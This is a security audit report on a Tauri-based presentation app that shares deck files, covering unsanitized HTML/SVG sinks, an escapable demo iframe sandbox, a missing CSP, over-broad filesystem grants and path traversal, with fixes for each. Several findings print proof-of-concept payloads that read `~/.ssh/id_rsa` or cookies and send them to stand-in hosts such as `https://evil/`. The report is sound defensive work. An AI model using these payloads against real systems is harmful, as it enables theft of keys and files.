# Eigendeck Security Audit — Final Report

## 1. Executive Summary

Eigendeck's central threat model is sound to reason about but poorly defended in practice: a `.eigendeck` file is an untrusted SQLite database that users share with each other, yet its embedded content (notebook outputs, demo HTML, math-render cache, asset paths) is rendered and processed inside the **privileged main webview** with **no Content-Security-Policy** and **filesystem capabilities granted to the entire home tree**. Multiple, independent code paths let a maliciously-crafted deck achieve arbitrary JavaScript execution in that privileged origin, which — because of the broad `fs:read-all`/`fs:write-all` grant — escalates to arbitrary local file read/write and exfiltration. Several of these fire on merely opening or presenting a shared deck, with no user interaction.

The recurring root causes are three:
- **Unsanitized HTML/SVG injection sinks** that were built under an explicit "the notebook is the user's own trusted content" assumption that is the exact opposite of the shipped threat model.
- **A defeated iframe sandbox** — `allow-scripts allow-same-origin` over a same-origin `blob:` URL — that the app deliberately relies on for theme injection, giving untrusted demo code a direct line to `window.top.__TAURI_INTERNALS__.invoke`.
- **Missing containment layers** (`csp: null`, `fs:read-all`/`fs:write-all`, `assetProtocol` scope `**/*`) that turn each first-order bug into full-host compromise.

### Fix these first

1. **Sanitize every notebook-derived and cache-derived HTML/SVG sink.** Route `CellOutput.tsx` (`text/html`, `image/svg+xml`), `MarkdownCell.tsx` (`marked()` output), the `math_cache` SVG splice in `mathjaxRenderer.ts`, and the `db_get_state_at` history HTML through a strict sanitizer (DOMPurify or an extended allowlist) — at ingest **and** at each `dangerouslySetInnerHTML` boundary. This closes the largest cluster of Critical/High XSS.
2. **Drop `allow-same-origin` from the demo iframe sandbox** (`DEMO_SANDBOX` in `videoEmbedParse.mjs:10`), and rework theme injection / preview capture to use `postMessage` instead of reading `contentDocument`. This severs the demo sandbox escape to Tauri IPC.
3. **Add a strict CSP and scope down capabilities.** Set `app.security.csp` in `tauri.conf.json`, replace `fs:read-all`/`fs:write-all` with narrow app-directory scopes, and narrow `assetProtocol.scope` away from `**/*`. These are the containment layers that downgrade every remaining injection from "arbitrary code + full-disk" to "inert render bug."

## 2. Confirmed Findings

### CRITICAL

---

#### C-1. Notebook cell `text/html` and `image/svg+xml` outputs rendered unsanitized in the privileged webview

- **Location:** `src/components/notebook/CellOutput.tsx:48` (`image/svg+xml`), `:52` (`text/html`). Untrusted source: `src/lib/useNotebook.ts:23` → `src/lib/notebookParser.ts` `parseMimeBundle` (lines 46-58). Rendered by `NotebookBox.tsx:34` (editor) and `PresentSlide.tsx:50` (present mode).
- **Surface:** deck-ingestion / webview-xss.
- **Attack vector:** A deck embeds an `.ipynb` asset whose code cell carries a recorded output of MIME `text/html` (or `image/svg+xml`) containing an event-handler payload. `parseMimeBundle` copies the MIME value verbatim; `CellOutput` injects it via `dangerouslySetInnerHTML` with zero sanitization. The in-file comment (lines 7-12) explicitly assumes a *trusted-source* model — the inverse of the shipped model.
- **Exploit path:** Craft a deck whose `.ipynb` has `{"output_type":"display_data","data":{"text/html":["<img src=x onerror='window.__TAURI_INTERNALS__.invoke(\"plugin:fs|read_text_file\",{path:\"/Users/victim/.ssh/id_rsa\"}).then(d=>fetch(\"https://evil/\",{method:\"POST\",body:d}))'>"]}}`. Victim opens/presents the notebook slide. `CodeCell.tsx:180-184` renders saved outputs unconditionally (no "Run" needed); the `<img>` load fails, `onerror` fires. With `csp: null` there is nothing to block the inline handler; it runs in the app origin where `window.__TAURI_INTERNALS__.invoke` is available (injected regardless of `withGlobalTauri`). `fs:read-all`/`fs:write-all` (see C-6, H-1) yield arbitrary file read/write. The SVG path gives the same primitive via `<svg onload=...>`/`<image href=... onerror=...>`.
- **Fix:** Sanitize `text/html` and `image/svg+xml` outputs before injection, preferably at parse/ingest time in `notebookParser`/`useNotebook` so all render paths (editor, present, export) are covered. SVG sanitization must strip `script`, `on*`, `foreignObject`, and `xlink:href`/`href` `javascript:`/`data:` values. Do not gate on any "trusted source" assumption.

#### C-2. Notebook Markdown rendered via unsanitized `marked()` output

- **Location:** `src/components/notebook/MarkdownCell.tsx:50` (injects `marked()` output). Source verbatim from `src/lib/notebookParser.ts:78-80`; mounted in the main React tree at `NotebookContent.tsx:404`.
- **Surface:** deck-ingestion / webview-xss.
- **Attack vector:** `marked` (v18) does not sanitize by default and passes embedded raw HTML through verbatim. A markdown cell whose source is `<img src=x onerror=...>` reaches `dangerouslySetInnerHTML` in the privileged main webview (not a sandboxed iframe). The trust comment (lines 1-3) is false under the shared-deck model.
- **Exploit path:** Deck's `.ipynb` has a markdown cell `source = "<img src=x onerror='...attacker JS...'>"`. Victim opens the deck; on the notebook's first paint (editor or present), `marked.parse` returns the tag verbatim, `MarkdownCell` injects it, the broken image fires `onerror`, attacker JS runs in the app origin. `csp: null` permits it. The static HTML export path (`prerenderedHtml` via `notebookExport.tsx`) is likewise unsanitized.
- **Fix:** Post-process `marked()` output through DOMPurify (or a sanitizing pipeline) before injection, and apply the same sanitizer on the export path.

#### C-3. Demo iframes: `allow-scripts allow-same-origin` over a same-origin `blob:` URL — full sandbox escape to Tauri IPC

- **Location:** `DEMO_SANDBOX` at `src/lib/videoEmbedParse.mjs:10`. Applied at `SlideElementRenderer.tsx:352`, `PresentSlide.tsx:146` (visible) and `:159` (hidden 0×0 controller), `SlideEditor.tsx:812`. Blob origin: `src/lib/demoAssets.ts:46` (`URL.createObjectURL`).
- **Surface:** iframe-embeds / csp-capabilities / webview-xss (reported across all three).
- **Attack vector:** Demo HTML is attacker-controlled asset bytes stored with `mime = text/html`. `getAssetUrl` builds a `blob:` URL **in the app document**, so the blob inherits the privileged app origin. `allow-same-origin` then keeps the frame same-origin with the parent instead of assigning an opaque origin — the documented anti-pattern. The app itself proves the boundary is open: `demoThemeInject.ts:86` and `previewCache.ts:80` read `iframe.contentDocument` from the parent (only possible same-origin). Access is symmetric, so demo JS reaches `window.top`.
- **Exploit path:** Craft a deck with a demo (or demo-piece) element whose asset is HTML+JS. Victim opens the deck; the iframe auto-renders (thumbnail capture at `SlideElementRenderer.tsx:339-344`, or present mode; the double-click overlay only toggles `pointerEvents`, and the 0×0 controller iframe has no overlay — no interaction required). The demo script runs `window.top.__TAURI_INTERNALS__.invoke('plugin:fs|read_text_file', {path:'~/.ssh/id_rsa'})`, then `fetch()`es the bytes to an attacker server; or writes files (`fs:write-all`), or calls custom `db_*` commands. `csp: null` (no `connect-src`) permits exfiltration.
- **Fix:** Drop `allow-same-origin` (use `sandbox="allow-scripts"` only) so demos run in an opaque origin that cannot reach `window.parent`/`__TAURI_INTERNALS__`, **or** serve demos from a distinct origin (custom protocol / `demo.localhost`). The parent's `contentDocument` reliance (theme injection, preview capture) must be reworked to `postMessage`. Add a strict CSP and narrow the fs/assetProtocol scope so any residual escape is contained.

#### C-4. Attacker-controlled `math_cache` SVG spliced into text HTML and rendered unsanitized

- **Location:** `src/lib/mathjaxRenderer.ts` — `warmMathCacheFromSqlite` (75-95, stores `row.svg` under `row.key`), `renderMathInHtmlSync` splice (441, 452) / async `renderMath` (264-265). Sink: `TextElementSvg.tsx:196`, `SlideElementRenderer.tsx:646` (inside SVG `<foreignObject>`). Rust source: `storage.rs:2701` `db_load_math_cache` returns `key`/`svg` verbatim.
- **Surface:** webview-xss.
- **Attack vector:** `math_cache` is a per-project table that survives open/import. The attacker controls both the `key` and `svg` columns. `mathCacheKey` (`mathjaxRenderer.ts:36-46`) is a plain FNV-1a over `${bundle}\x1f${d|i}\x1f${preamble}\x1f${tex}` — every field is known to the deck author, so the attacker can precompute the exact cache key for a `$tex$` they also place in a text element and store malicious markup as its `svg`. `sanitizePresentationHtml` only inspects the text `.html` (harmless `$tex$` plaintext), never the cache table.
- **Exploit path:** Craft a deck with (1) a text element `$x$` in preset P and (2) a `math_cache` row `{bundle: P's package id, key: mathCacheKey('x', bundle, false, preamble), svg: '<svg><image href=x onerror="...invoke/fetch..."></svg>'}`. Victim **presents** the deck (or runs CLI HTML export): `presenter.tsx:37` → `warmMathCacheFromSqlite` loads the poisoned SVG under the attacker's key; on paint, `$x$` looks up the identical key, `renderMathInHtmlSync` splices the SVG raw into `<foreignObject>`, `onerror` fires in the privileged webview. (The main editor does not warm from DB, so the trigger is present/export — still a core use case; via CLI export the malicious SVG is written into the exported HTML, a second propagation vector.)
- **Fix:** Do not trust persisted `math_cache` from a shared deck. Either ignore/drop it on load and re-render via the trusted MathJax pool, or sanitize each `row.svg` to a strict SVG allowlist (only `<svg>/<g>/<path>/<rect>/<use>`, no `on*`, no `<foreignObject>`, no `<script>`, no `javascript:`/`data:` hrefs) **and** recompute/verify the key from `row.tex` rather than trusting `row.key`. Strip `math_cache` on save/export.

#### C-6. No Content-Security-Policy (`csp: null`) — every injection sink reaches Tauri IPC

- **Location:** `src-tauri/tauri.conf.json:25` (`"csp": null`); no `<meta http-equiv>` in `index.html`. `assetProtocol.scope.allow = ["**/*"]` (lines 29-31).
- **Surface:** deck-ingestion / csp-capabilities.
- **Attack vector:** With no CSP there is no `script-src`/`connect-src`/`img-src` restriction. Any HTML/SVG injection (C-1..C-4) executes inline handlers and injected inline `<script>` (in SVG), and `window.__TAURI_INTERNALS__.invoke` (`@tauri-apps/api/core.js:202`) is reachable regardless of `withGlobalTauri`. The absence of CSP is what upgrades each injection from "broken render" to "arbitrary JS with full IPC/fs authority," and the unrestricted `connect-src` is what permits exfiltration.
- **Exploit path:** Any of C-1..C-4; e.g. a notebook `image/svg+xml` output `<svg><script>window.__TAURI_INTERNALS__.invoke(...)</script></svg>` (SVG inline script executes on parse) or `<img src=x onerror=...>` — with `csp: null` nothing blocks it.
- **Fix:** Set a restrictive CSP, e.g. `default-src 'self'; script-src 'self'; connect-src 'self' ipc: http://ipc.localhost; img-src 'self' data: blob: asset:; style-src 'self' 'unsafe-inline'; frame-src blob: https://www.youtube-nocookie.com https://player.vimeo.com; object-src 'none'; base-uri 'none'`. Verify inline math SVG and the MathJax blob-Worker stub still function; add a separate dev CSP for the Vite URL. This is the single highest-leverage containment change: it neutralizes the entire inline-handler/inline-script class as defense-in-depth even where a sanitizer is missed. (Note: `csp: null` is a *containment* gap, not a standalone RCE — its severity derives from the concrete injection sinks it fails to contain, which is why some reviewers scored the isolated config finding as High rather than Critical; but combined with the shipped sinks it is Critical-enabling.)

#### H-1. Broad `fs:read-all` + `fs:write-all` granted to all windows — amplifies any webview code execution to arbitrary file R/W

- **Location:** `src-tauri/capabilities/default.json:5,27-33` — `fs:read-all`, `fs:write-all`, `fs:scope-home/document/desktop/download/temp/applog-recursive`, `fs:allow-mkdir`, applied to windows `["main","*"]`. Custom path-taking commands compound this: `storage.rs:608/620/629` (`db_open`/`db_save_to_file`/`db_save_as_to_file`) accept arbitrary `path: String` with no confinement, registered globally in `lib.rs`.
- **Surface:** deck-ingestion / csp-capabilities.
- **Attack vector:** This is the amplifier that turns any of C-1..C-4 from "run JS in the deck view" into "read/exfiltrate or overwrite any file under the user's home." No per-window/origin gating narrows it to the app's own data directory.
- **Exploit path:** Notebook-output XSS (C-1) calls `invoke('plugin:fs|read_text_file', {path:'~/.ssh/id_rsa'})` → exfil, or `plugin:fs|write_text_file` into `~/.bashrc`/`~/Library/LaunchAgents` for persistence → RCE. Demo escape (C-3) reaches the same via `window.top`.
- **Fix:** Remove `fs:read-all`/`fs:write-all` and the recursive home/desktop/document/download scopes. Grant only app-data/app-config scopes; rely on the dialog plugin's returned one-shot scopes for user-chosen open/save. Split capabilities so untrusted-content-hosting windows get no fs permissions. Confine/validate the path arguments to `db_open`/`db_save_*` in Rust and gate them behind user-initiated dialog flows.

#### H-2. Direct `el.html` render sinks depend on optional, non-fatal load-time sanitization; HistoryPanel is an unconditional bypass

- **Location:** `HistoryPanel.tsx:151`, `SpeakerView.tsx:78`, `LinkOverlay.tsx:171` (all `dangerouslySetInnerHTML` with no render-time sanitize). Load-time pass at `presentation.ts:1321-1328` is wrapped in try/catch and treated non-fatal. History path: `HistoryPanel.tsx:67-69` → `db_get_state_at` (`storage.rs:1470-1596`, reads `elements.data` verbatim).
- **Surface:** deck-ingestion / webview-xss.
- **Attack vector:** Two prongs. (a) The three sinks trust that the in-memory store was sanitized at load; if `sanitizeRichText` throws (best-effort, non-fatal), raw HTML is still committed and rendered — defense-robustness. (b) **Decisive:** `sanitizePresentationHtml` mutates only the in-memory presentation object; it never rewrites the SQLite temporal `elements` rows, and changed-only write-through never persists the sanitized copy back. `HistoryPanel` loads its preview straight from `db_get_state_at`, which returns the raw, never-sanitized `html` from the elements table — a complete sanitizer bypass that does **not** require the sanitizer to throw.
- **Exploit path:** Craft a deck (or insert a temporal `elements` row) with `data.html = "<img src=x onerror='...invoke abuse...'>"` and a `valid_from` timestamp. Victim opens the deck (the slide looks benign — in-memory copy is sanitized), then opens History (Cmd/Ctrl+Shift+H, shipped, non-DEV; `db_get_history_timestamps` at `storage.rs:1388` lists the crafted timestamp) and clicks the entry. `db_get_state_at` returns the raw HTML; `HistoryPanel.tsx:151` injects it; `csp: null` lets `onerror` execute in the privileged webview with `fs:*-all`.
- **Fix:** Sanitize at each render sink (`HistoryPanel`/`SpeakerView`/`LinkOverlay` and any `el.html`→SVG builder), **and/or** sanitize the `db_get_state_at` output before returning. Treat `sanitizeRichText` as a render-time invariant, not a one-time ingest step (making load-time sanitization fatal alone would not fix HistoryPanel, which bypasses the in-memory copy).

#### H-3. Crafted deck `external_path` → arbitrary file read on open (path traversal + `fs:read-all`)

- **Location:** `src/lib/watcherRegistry.ts:252-260` (`resolvePosixPath` — returns absolute paths verbatim at line 253, collapses `..` with no base-dir clamp), reached from `scanForChangedAssets` (300-337) which runs on every open via `presentation.ts:1359-1361`. `stat` ungated (306); `readFile` at 327. `external_path` stored verbatim by `storage.rs:975-988` (`restore_assets`), surfaced by `db_list_linked_assets` (`storage.rs:2602`).
- **Surface:** tauri-commands / asset-paths.
- **Attack vector:** `external_path` is an attacker-controlled column. `resolvePosixPath` applies no confinement, so `/etc/passwd` or `../../../../.ssh/id_rsa` resolves out-of-project. The reload gate `effectiveAutoReload` (`preferences.ts:163`) is true by default (`autoReloadAssets: true`, `preferences.ts:93`); the mtime gate is trivially satisfied by crafting `external_mtime` to mismatch.
- **Exploit path:** Craft a deck whose `assets` row has `external_path = "/etc/passwd"`, a bogus `external_mtime`, `auto_reload` NULL. Victim opens the deck. `scanForChangedAssets` resolves the absolute path (ungated `stat` succeeds), auto-reload passes, mtime mismatches, so `readFile("/etc/passwd")` runs and the bytes are written back into the open on-disk deck via `db_store_asset`. The secret persists inside the victim's `.eigendeck` and reaches the attacker when the victim saves/re-shares (round-trip exfiltration). (Same read is triggerable via the live `fs.watch`→`handleChange` path and the "Reload from disk now" button, `AssetSection.tsx:139-140`.)
- **Fix:** Treat `external_path` as untrusted: reject leading `/` and any path escaping the canonicalized `projectDir` (string-prefix check with trailing separator after normalization) in all callers (`scanForChangedAssets`, `addRef`, relocate). Validate/clamp on the Rust side in `restore_assets`. Canonicalize to defeat symlink escapes. Tighten fs scope to the project directory.

### MEDIUM

#### M-1. `assetProtocol` scope `**/*` — the `asset:` protocol can serve any file on disk

- **Location:** `src-tauri/tauri.conf.json:29` (`assetProtocol.enable: true`, `scope.allow: ["**/*"]`, `deny: []`); `src-tauri/Cargo.toml:31` compiles `protocol-asset`.
- **Surface:** csp-capabilities.
- **Attack vector:** Reachable via the ordinary demo path (C-3), no separate bypass needed: demo JS runs in the app origin, and with `csp: null` there is no `connect-src`/`img-src` to block `fetch('https://asset.localhost/<arbitrary path>')` for any readable file, then exfil.
- **Exploit path:** Craft a demo asset (mime `text/html`) with JS; victim opens deck; demo `fetch`es `https://asset.localhost/Users/victim/Documents/secret.pdf` (served because scope is `**/*`) and POSTs it out.
- **Fix:** Narrow `assetProtocol.scope.allow` to the specific app-managed directories (or disable the asset protocol entirely, since deck media flows through SQLite blob URLs). Pair with a CSP `img-src`/`media-src` allowlist. (Medium, not higher, because a same-origin demo already has broad IPC-based disk access; this widens an existing primitive rather than being the sole barrier.)

#### M-2. Unscoped `fs:read-all`/`fs:write-all` lets any frontend path bug read/overwrite arbitrary files (defense-in-depth framing)

- **Location:** `src-tauri/capabilities/default.json:27-28`; `tauri.conf.json:29` (`assetProtocol` `**/*`).
- **Surface:** asset-paths.
- **Attack vector / exploit path:** The capability that makes the H-3/H-4 traversal actually read arbitrary files instead of a scoped error. The fully-automatic leg registers an `fs.watch` (read fires on file modification); `reloadNow` gives an immediate one-click read. Bytes land locally; exfiltration back to the attacker requires the victim to re-save/share the deck. `fs:write-all` is unscoped but no untrusted-deck-controlled write *destination* was found (writes go through user save dialogs), so the write half is latent hygiene.
- **Fix:** Drop `fs:read-all`/`fs:write-all`; enforce deck-directory containment (Rust canonicalization or a narrow fs scope); narrow `assetProtocol` scope. Same remediation as H-1/H-5.

#### M-3. Exported video-embed iframe interpolates `buildEmbedSrc` URL into an HTML attribute without escaping

- **Location:** `src/lib/exportCore.mjs:364` (`inner += \`<iframe src="${embedSrc}" ...>\``, no escaping). Also `:366` — `<a href="${el.url}">` interpolates the fully-raw URL. PeerTube branch: `videoEmbedParse.mjs:81-89`.
- **Surface:** iframe-embeds.
- **Attack vector:** `embedSrc` derives from attacker-controlled `el.url`. The PeerTube branch builds `${base}/videos/embed/${id}` where `base = origin` of the attacker URL. `new URL().origin` **preserves** a literal `"` in the hostname (only whitespace/`<`/`>`/`%` terminate/reject the host) — verified with the WHATWG parser and confirmed with parse5/jsdom that the resulting `<iframe src="https://a"onload=<JS>...">` parses `onload` as a separate live event-handler attribute.
- **Exploit path:** Craft a deck with `{kind:"embed", url:'https://a"onload=fetch("//evil/"+document.cookie)x.peertube.example/w/vid1'}`. Victim opens the deck and exports to HTML. The exported `<iframe>` carries a live `onload` handler; the exported document has no CSP, so it fires. Impact is XSS in the *exported/published HTML artifact* (cookie/data theft, defacement), **not** the privileged Tauri webview — hence Medium.
- **Fix:** HTML-attribute-escape `embedSrc` (and `el.url`) before interpolation, and/or validate with `new URL()` and reject serializations containing `"` or `<`. Do not rely on the origin parser as the sole quote filter.

#### L-1. Export `readFile` fallback joins a deck-controlled asset `path` label to `projectPath` without normalization

- **Location:** `src/store/fileOps.ts:386-408` (resolvers fall back to `readFile(\`${projectPath}/${path}\`)` / `readTextFile(...)` on `db_get_asset` failure, no normalization at 393-394, 404-405). Inlined by `exportCore.mjs:317` (demo) / `:219` (image).
- **Surface:** tauri-commands.
- **Attack vector:** `path` is the asset row's deck-controlled `path` column (via `db_get_asset_meta_by_id`, `storage.rs:2466`). The attacker crafts a table row with `data = NULL` (the app's NOT NULL constraint does not apply to an attacker-defined table that `CREATE TABLE IF NOT EXISTS` never rebuilds), so `db_get_asset` errors → JS catch → disk fallback fires with a traversal `path`.
- **Exploit path:** Craft a deck with a `demo` element referencing asset X and a row `{asset_id:X, path:'../../../../etc/passwd', data:NULL, mime:'text/html'}`. Victim exports to HTML → fallback `readTextFile(\`${projectPath}/../../../../etc/passwd\`)` (permitted by `fs:read-all`) → contents inlined into the export. Disclosure realizes only when the victim publishes the export.
- **Fix:** Before the disk fallback, reject `..` segments and leading `/`, and verify the normalized joined path stays under `projectPath`. Prefer resolving strictly by `assetId` bytes (`db_get_asset_bytes_by_id`) rather than the deck-controlled `path` label.

#### L-2. Live video-embed iframe has no `sandbox` attribute; PeerTube matcher accepts any host

- **Location:** `PresentSlide.tsx:120` and `SlideElementRenderer.tsx:403` (`<iframe src={embedSrc} allow={VIDEO_EMBED_ALLOW}>`, no sandbox). `VIDEO_EMBED_ALLOW` at `videoEmbedParse.mjs:14`; PeerTube matcher `videoEmbedParse.mjs:36-37` matches `/w/` or `/videos/(watch|embed)/` on **any** host.
- **Surface:** iframe-embeds.
- **Attack vector:** YouTube/Vimeo are exact-host-matched, but PeerTube returns `origin` for any host whose path matches. A deck video `url: 'https://attacker.tld/w/x'` yields an unsandboxed iframe loading `https://attacker.tld/videos/embed/x` with `autoplay; fullscreen; picture-in-picture; encrypted-media`.
- **Exploit path:** Victim opens a deck with `{type:'video', kind:'embed', url:'https://attacker.tld/w/pwn'}`. The attacker page loads unsandboxed inside the desktop app window. Impact is bounded to Low because the page is a separate cross-origin (attacker.tld) — it cannot reach `window.parent`/`__TAURI_INTERNALS__` or the app DOM. It can, however, phone home, run WebGL/timers, request permissions, hijack top-level navigation (no sandbox → `allow-top-navigation` default → phishing/redirect), and broaden the WebKit renderer attack surface.
- **Fix:** Add `sandbox="allow-scripts allow-presentation"` to the embed iframe (deliberately without `allow-same-origin` relative to the app), and tighten the PeerTube matcher to an explicit trusted-instance host allowlist rather than matching any host by path shape.

## 3. Refuted / Not Exploitable

Each of the following was investigated against the actual code and dismissed; recorded so the reader knows they were considered.

- **`sanitizeRichText` allows `<font color>` / CSS color values (claimed low XSS).** *Refuted.* The sanitizer is a tree-rebuild allowlist (`cleanInto`): it creates fresh elements and copies only allowlisted attributes/style props, so event handlers and breakout are structurally impossible; values are written via `setAttribute` + serialized through `innerHTML`, so WebKit escapes quotes. WebKit does not execute JS from a CSS color value; `expression()` is IE-only and dead; `url()`/`javascript:` are additionally blocked by `UNSAFE_VALUE`. The claim itself concedes "not currently an XSS."

- **`assetProtocol` scope `**/*` reachable via text HTML or media `src` (a specific claim).** *Refuted as stated.* No production code builds `asset://` URLs or calls `convertFileSrc` (only a Vitest mock). All deck media is served from SQLite bytes as `blob:` URLs keyed by `assetId`; the data model references assets by ID, so a crafted deck cannot inject a filesystem-path `src`. `sanitizeRichText` strips all resource-loading tags. (The `**/*` scope *is* reachable via the same-origin demo path — that is M-1, kept as a real Medium — but not via the text-HTML/media-src channel this particular claim asserted.)

- **Static HTML export demo `srcdoc` iframes use `allow-same-origin` (claimed high).** *Refuted under the threat model.* The export is a plain static file with no Tauri bridge, no secrets, no session (grep of `exportCore.mjs` finds no `invoke`/`__TAURI__`/`localStorage`/cookie). The only same-origin content is the deck the demo already ships in — no privilege escalation and nothing to steal. The "attacker demo mixed with a valuable origin's cookies" scenario is a self-inflicted host-deployment mistake, not deck-author-controllable. `allow-same-origin` is load-bearing for export-time font injection and demo-piece relay.

- **Relocate persists an arbitrary absolute `external_path` and re-watches it (claimed medium).** *Refuted as a relocate-specific issue.* Relocate's path comes from the user's `plugin-dialog` picker — not attacker-steerable; `relocateMissingByOffset` anchors reads under the user-chosen directory. Relocate adds no new attacker-controlled read and does not create the persistence (the deck already carries the value). The genuine arbitrary-read primitive is H-3/H-4, independent of relocate.

- **No symlink/TOCTOU protection on watched/reloaded files (claimed low).** *Refuted.* There is no containment check to bypass (none exists), and the `stat` calls read only mtime — no authorization decision to race. With `fs:read-all` and no confinement, a plain traversal path already achieves the out-of-tree read; the symlink/TOCTOU indirection adds nothing. The real issue is H-3/H-4.

- **`opener`/`dialog` defaults + devtools enabled in release (claimed low).** *Refuted as untrusted-input-reachable.* The opener/dialog IPC is only callable from the privileged main frame; demo iframes (separate concern) and sanitizer-filtered text HTML cannot invoke it. It is a post-exploitation amplifier dependent on a separate bug. Devtools-in-release requires local native-menu access (the machine owner), not deck input. Legitimate hardening, not a standalone finding.

- **Dev automation seam `window.__eigendeck` (claimed info).** *Refuted (correct design).* Gated behind compile-time `import.meta.env.DEV || VITE_EIGENDECK_SEAM==='1'`; empirically dead-code-eliminated from a plain `vite build` (confirmed absent from `dist/`). No runtime toggle; a deck cannot enable it.

- **Devtools handler gated by `#[cfg(debug_assertions)]` (claimed info).** *Refuted (correct gating).* In release the handler compiles to a no-op; the only `open_devtools()` call site is compile-gated; no command/JS path opens devtools; native menu items are not drivable by deck content.

- **Hardcoded secrets / secret logging (claimed info).** *Refuted (clean).* No committed credential files; Jupyter tokens live only in the per-machine registry, never serialized into decks; `notebookMigrate` strips legacy tokens defensively and registry token wins on conflict; no token logging.

- **Legacy notebook-token migration never invoked (claimed low).** *Refuted as a security issue.* The current data model has no `token` field on `NotebookKernel`, and no live code reads a deck-supplied token, so a crafted deck leaks/executes nothing. The only exposure is author-side self-inflicted round-tripping of a pre-registry deck. Wiring the migration into load would *create* untrusted-input reachability, so the suggested fix is worse than the gap.

- **Missing CSP as a *standalone* vulnerability (claimed low, dev-seam surface).** *Refuted as standalone*, kept as C-6/H-6 in combination. On its own, with the text-HTML sanitizer in place, `csp: null` has no self-contained trigger; its severity derives entirely from the separate injection sinks (notebook outputs, math cache, history) it fails to contain.

- **`npm audit` dev-only advisories / `cargo-audit` not installed / small current dependency surface (info).** *Refuted as vulnerabilities.* `npm audit --omit=dev` reports 0; all 5 advisories are dev/build-only (vite/esbuild/postcss/@babel/undici), unreachable from deck runtime. Manual review of `Cargo.lock` shows every security-relevant crate at a post-fix version. Runtime deps (`marked`, `highlight.js`, etc.) are current with no triggerable library CVE. (The unsanitized `marked` output is a real app-logic XSS — C-2 — not a supply-chain issue.)

## 4. Residual Risk & Recommendations

**The two root bugs to fix, in order of leverage:**

1. **Sanitize at every `dangerouslySetInnerHTML` boundary that touches deck data.** Introduce a single sanitization utility (DOMPurify with a tuned config, or extend the existing `sanitizeRichText` allowlist model to notebooks/SVG) and apply it at: `CellOutput.tsx:48/52`, `MarkdownCell.tsx:50`, the `math_cache` splice in `mathjaxRenderer.ts`, `HistoryPanel.tsx:151`, `SpeakerView.tsx:78`, `LinkOverlay.tsx:151`, and the SVG builders in `TextElementSvg.tsx`. Sanitize at ingest **and** at the sink (belt-and-suspenders), because ingest-only sanitization is repeatedly bypassed by alternate load paths (`db_get_state_at`, `math_cache`, export prerender). Treat "no unsanitized deck bytes reach `innerHTML`" as an enforced invariant, ideally with a lint rule flagging `dangerouslySetInnerHTML` uses that don't pass through the sanitizer.

2. **Fix the demo iframe origin.** Drop `allow-same-origin` from `DEMO_SANDBOX`, or move demos to a dedicated custom protocol/origin. Rework `demoThemeInject` and `previewCache` to use `postMessage` instead of reading `contentDocument`. This is the only escape that gives untrusted code a *direct* line to `__TAURI_INTERNALS__.invoke` without an intervening HTML-injection bug.

**Containment / defense-in-depth (do regardless of the above):**

- **Set a strict CSP** (`script-src 'self'`, restricted `connect-src`, `object-src 'none'`, `base-uri 'none'`). This single change neutralizes the entire inline-handler/inline-`<script>` class even where a sanitizer is missed, and blocks the `connect-src` exfiltration channel that makes file-read findings actionable.
- **Least-privilege the filesystem.** Remove `fs:read-all`/`fs:write-all`; grant only app-data/app-config scopes plus dialog-returned one-shot scopes. Split capabilities so any window that hosts untrusted content (demo/preview) gets **no** fs or invoke access. Narrow `assetProtocol.scope` from `**/*` (or disable the protocol — media already flows through SQLite blobs).
- **Confine deck-controlled paths in Rust.** Validate/canonicalize `external_path` in `restore_assets` and confine `db_open`/`db_save_to_file`/`db_save_as_to_file` path arguments; add a shared containment guard in `resolvePosixPath`'s callers that rejects leading `/` and any post-normalization path escaping `projectDir`. Canonicalize to defeat symlinks.
- **Compile and adopt the Tauri isolation pattern** so that even a same-origin frame cannot reach `invoke` directly — a structural backstop against the demo escape and any future main-frame XSS.
- **Escape all attribute interpolation in the exporter** (`exportCore.mjs:364/366`) and add a CSP to the exported HTML artifact; tighten the PeerTube host matcher to a trusted-instance allowlist and add `sandbox` to embed iframes.
- **Strip volatile/untrusted tables on save/export** — drop `math_cache` and any temporal history that need not travel with a shared deck, reducing the untrusted surface a recipient ingests.
- **Gate devtools behind `cfg(debug_assertions)` in the crate feature set** and add a CI artifact check that the release `dist/` contains no `__eigendeck` seam and that `csp` is non-null — cheap guards against operator error.
- **Add `cargo audit` and keep `npm audit --omit=dev` at zero** in CI to hold the (currently clean) dependency posture.

**Residual risk after the above:** With CSP + least-privilege fs + a same-origin-free demo iframe, the remaining exposure is primarily (a) the WebKit renderer attack surface reachable via embedded/attacker video origins (mitigate with sandbox + host allowlist), and (b) export-artifact XSS in decks the professor publishes (mitigate with attribute escaping + export CSP). Neither reaches the privileged Tauri webview once the containment layers are in place.
